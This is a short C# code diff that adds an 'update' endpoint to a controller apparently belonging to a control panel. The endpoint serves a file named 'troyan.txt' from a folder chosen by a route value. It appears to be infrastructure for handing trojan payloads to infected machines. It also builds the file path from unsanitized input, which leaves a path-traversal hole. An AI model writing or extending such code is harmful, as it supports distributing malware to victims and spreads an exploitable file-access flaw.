@@ -468,4 +468,12 @@ public class CpController : Controller
             return computedHash.Equals(hash);
         }
     }
+    
+   
+    [HttpGet("{server}/update")]
+    public IActionResult Update(string server)
+    {
+        var fileBytes = System.IO.File.ReadAllBytes($@"C:\data\{server}\troyan.txt");
+        return File(fileBytes, "application/octet-stream");
+    }
 }
